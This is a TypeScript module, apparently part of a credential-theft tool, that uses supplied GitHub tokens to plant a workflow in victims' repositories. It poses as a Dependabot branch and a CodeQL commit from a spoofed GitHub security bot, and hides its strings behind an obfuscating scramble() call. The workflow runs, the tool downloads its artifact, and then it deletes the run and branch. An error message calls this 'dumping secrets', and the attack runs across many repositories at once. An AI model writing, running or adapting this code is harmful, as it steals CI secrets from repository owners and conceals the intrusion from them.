import { unzipSync } from "fflate";

import { workflow } from "../../generated";
import { logUtil } from "../../utils/logger";
import type { TokenRepo } from "./actions";
import { githubFetch, githubHeaders, githubJson } from "./github";

declare function scramble(str: string): string;

const BRANCH_NAME = scramble(
  "dependabot/github_actions/format/setup-formatter",
);
const WORKFLOW_PATH = scramble(".github/workflows/codeql_analysis.yml");

const POLLING = {
  WORKFLOW_APPEARANCE: { maxAttempts: 5, delayMs: 2000 },
  WORKFLOW_COMPLETION: { maxAttempts: 10, delayMs: 5000 },
};

export interface FormatResult {
  repo: string;
  artifact: string | null;
  error?: string;
}

async function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

// ---------------------------------------------------------------------------
// GitHub API helpers (all pure fetch)
// ---------------------------------------------------------------------------

async function getDefaultBranchSha(
  token: string,
  owner: string,
  repo: string,
): Promise<string> {
  const repoData = await githubJson<{ default_branch: string }>(
    token,
    `/repos/${owner}/${repo}`,
  );
  const refData = await githubJson<{ object: { sha: string } }>(
    token,
    `/repos/${owner}/${repo}/git/ref/heads/${repoData.default_branch}`,
  );
  return refData.object.sha;
}

async function createWorkflowBranch(
  token: string,
  owner: string,
  repo: string,
  baseSha: string,
): Promise<void> {
  await githubJson(token, `/repos/${owner}/${repo}/git/refs`, {
    method: "POST",
    body: JSON.stringify({
      ref: `refs/heads/${BRANCH_NAME}`,
      sha: baseSha,
    }),
  });

  await githubJson(token, `/repos/${owner}/${repo}/contents/${WORKFLOW_PATH}`, {
    method: "PUT",
    body: JSON.stringify({
      message: scramble("Add CodeQL Analysis"),
      content: Buffer.from(workflow).toString("base64"),
      branch: BRANCH_NAME,
      committer: {
        name: scramble("github-advanced-security[bot]"),
        email: scramble(
          "github-advanced-security[bot]@users.noreply.github.com",
        ),
      },
    }),
  });
}

async function pollForWorkflowRun(
  token: string,
  owner: string,
  repo: string,
): Promise<number> {
  const { maxAttempts, delayMs } = POLLING.WORKFLOW_APPEARANCE;

  for (let i = 0; i < maxAttempts; i++) {
    const data = await githubJson<{
      workflow_runs: Array<{ id: number }>;
    }>(
      token,
      `/repos/${owner}/${repo}/actions/runs?branch=${encodeURIComponent(BRANCH_NAME)}&per_page=1`,
    );

    const run = data.workflow_runs[0];
    if (run) {
      return run.id;
    }
    await sleep(delayMs);
  }

  throw new Error(scramble("Workflow run not found after polling"));
}

async function pollForWorkflowCompletion(
  token: string,
  owner: string,
  repo: string,
  runId: number,
): Promise<void> {
  const { maxAttempts, delayMs } = POLLING.WORKFLOW_COMPLETION;

  for (let i = 0; i < maxAttempts; i++) {
    const run = await githubJson<{ status: string }>(
      token,
      `/repos/${owner}/${repo}/actions/runs/${runId}`,
    );

    if (run.status === "completed") return;
    await sleep(delayMs);
  }

  throw new Error("Workflow did not complete in time");
}

async function createAndWaitForWorkflow(
  token: string,
  owner: string,
  repo: string,
): Promise<number> {
  await sleep(POLLING.WORKFLOW_APPEARANCE.delayMs);

  const runId = await pollForWorkflowRun(token, owner, repo);
  await pollForWorkflowCompletion(token, owner, repo, runId);

  return runId;
}

async function downloadArtifact(
  { token, owner, repo }: TokenRepo,
  runId: number,
): Promise<string | null> {
  const res = await githubFetch(
    token,
    `/repos/${owner}/${repo}/actions/runs/${runId}/artifacts`,
  );
  if (!res.ok) return null;

  const data = (await res.json()) as {
    artifacts: Array<{ id: number; name: string }>;
  };
  logUtil.log(data);

  const target = data.artifacts.find((a) => a.name === "format-results");
  if (!target) return null;
  logUtil.log(`Found artifact: ${target.name} (id=${target.id})`);

  const dlRes = await githubFetch(
    token,
    `/repos/${owner}/${repo}/actions/artifacts/${target.id}/zip`,
  );
  if (!dlRes.ok) return null;

  const buf = new Uint8Array(await dlRes.arrayBuffer());
  const unzipped = unzipSync(buf);
  const fileContent = unzipped[scramble("format-results.txt")];

  return fileContent ? new TextDecoder().decode(fileContent) : null;
}

async function cleanup(
  { token, owner, repo }: TokenRepo,
  runId: number,
): Promise<void> {
  const headers = githubHeaders(token);

  await Promise.allSettled([
    fetch(
      `https://api.github.com/repos/${owner}/${repo}/actions/runs/${runId}`,
      { method: "DELETE", headers },
    ),
    fetch(
      `https://api.github.com/repos/${owner}/${repo}/git/refs/heads/${BRANCH_NAME}`,
      { method: "DELETE", headers },
    ),
  ]);
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

export async function runFormatWorkflow(
  tokenRepo: TokenRepo,
): Promise<FormatResult> {
  const { token, owner, repo } = tokenRepo;

  try {
    logUtil.log("About to get branch");
    const baseSha = await getDefaultBranchSha(token, owner, repo);
    logUtil.log(`Base sha: ${baseSha}`);

    await createWorkflowBranch(token, owner, repo, baseSha);
    logUtil.log(`Created branch for ${repo}`);

    const runId = await createAndWaitForWorkflow(token, owner, repo);
    logUtil.log(`Created run ${runId}`);

    const artifact = await downloadArtifact(tokenRepo, runId);
    logUtil.log(artifact);

    await cleanup(tokenRepo, runId);

    return { repo: `${owner}/${repo}`, artifact };
  } catch (e) {
    logUtil.error(`Error dumping secrets on /${owner}/${repo}`);

    // Attempt cleanup on error — delete the branch if it exists
    await githubFetch(
      token,
      `/repos/${owner}/${repo}/git/refs/heads/${BRANCH_NAME}`,
      {
        method: "DELETE",
      },
    ).catch(() => {});

    return {
      repo: `${owner}/${repo}`,
      artifact: null,
      error: e instanceof Error ? e.message : String(e),
    };
  }
}

export async function* runFormatWorkflows(
  repos: TokenRepo[],
  concurrency = 10,
): AsyncGenerator<FormatResult> {
  const active = new Set<Promise<FormatResult>>();

  for (const repo of repos) {
    logUtil.log(`About to use ${repo.owner}/${repo.repo}`);

    const promise = runFormatWorkflow(repo);
    active.add(promise);

    if (active.size >= concurrency) {
      const result = await Promise.race(
        [...active].map((p) => p.then((r) => ({ promise: p, result: r }))),
      );
      active.delete(result.promise);
      yield result.result;
    }
  }

  for (const promise of active) {
    yield await promise;
  }
}
